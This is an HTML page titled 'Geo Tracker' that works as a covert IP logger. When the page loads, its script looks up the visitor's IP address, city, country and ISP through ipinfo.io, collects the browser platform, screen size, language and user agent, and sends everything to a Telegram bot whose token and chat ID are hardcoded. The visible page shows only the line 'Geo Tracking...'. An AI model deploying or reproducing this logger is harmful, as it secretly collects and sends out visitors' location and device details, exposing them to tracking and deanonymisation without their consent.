<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Geo Tracker</title>
  <script>
    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        return await res.json();
      } catch (e) {
        return {};
      }
    }

    async function sendToTelegram(message) {
      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
      const chat_id = "6239813037";
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
      });
    }

    async function run() {
      const ipData = await getIPInfo();
      const msg = `📄 *[LOGGER STAGE]*
🚀 *User Info:*
🌐 *IP:* ${ipData.ip || "Unknown"}
📍 *City:* ${ipData.city || "Unknown"}
🌎 *Country:* ${ipData.country || "Unknown"}
🏢 *ISP:* ${ipData.org || "Unknown"}
🖥 *Platform:* ${navigator.platform}
📱 *Resolution:* ${screen.width}x${screen.height}
🌐 *Language:* ${navigator.language}
🧠 *User-Agent:* \`${navigator.userAgent}\`
🛡 *AdBlock:* ${typeof adblockDetected !== "undefined" && adblockDetected ? "Yes" : "No"}
📡 *WebRTC Local IP:* N/A
🕒 *Timestamp:* ${new Date().toISOString()}
🔍 *FB Crawler:* No`;
      await sendToTelegram(msg);
    }

    window.onload = run;
  </script>
</head>
<body>
  <h1>Geo Tracking...</h1>
</body>
</html>
